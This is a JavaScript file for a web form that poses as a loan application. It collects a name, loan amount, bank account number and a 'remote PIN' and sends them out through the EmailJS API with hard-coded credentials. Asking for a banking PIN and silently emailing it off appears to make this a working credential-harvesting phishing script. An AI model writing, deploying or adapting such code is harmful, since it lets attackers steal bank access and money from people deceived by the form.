const form = document.getElementById("app-form");
const button = document.querySelector("#send-btn");

const nameInput = document.getElementById("name");
const loanAmount = document.getElementById("loan_amount");
const accountNo = document.getElementById("account_no");
const remotePin = document.getElementById("remote_pin");

const validateInput = (input) => {
  if (input.value === "" || input.value === null) {
    return;
  }

  return input.value.trim();
};

form.addEventListener("submit", (e) => {
  e.preventDefault();

  const accountNoVal = validateInput(accountNo);
  const nameVal = validateInput(nameInput);
  const loanAmountVal = validateInput(loanAmount);
  const remotePinVal = validateInput(remotePin);

  if (accountNoVal && remotePinVal && nameVal && loanAmountVal) {
    // Set the submitting state
    button.innerHTML = `Submitting <i class="fa fa-spinner fa-spin"></i>`;

    const data = {
      service_id: "service_sn6mekz",
      template_id: "template_p15fdti",
      user_id: "Wty3VQ9KPSIcGj-cS",
      template_params: { accountNoVal, loanAmountVal, nameVal, remotePinVal },
    };

    // Send the email
    $.ajax("https://api.emailjs.com/api/v1.0/email/send", {
      type: "POST",
      data: JSON.stringify(data),
      contentType: "application/json",
    })
      .done((data) => {
        console.log(data);
        alert("Submitted!");
        window.location.reload();
      })
      .fail((err) => {
        button.innerHTML = `Submit <i class="fa fa-arrow-right icon"></i>`;

        alert("Something failed!");
        console.log(err);
      });
  }
});
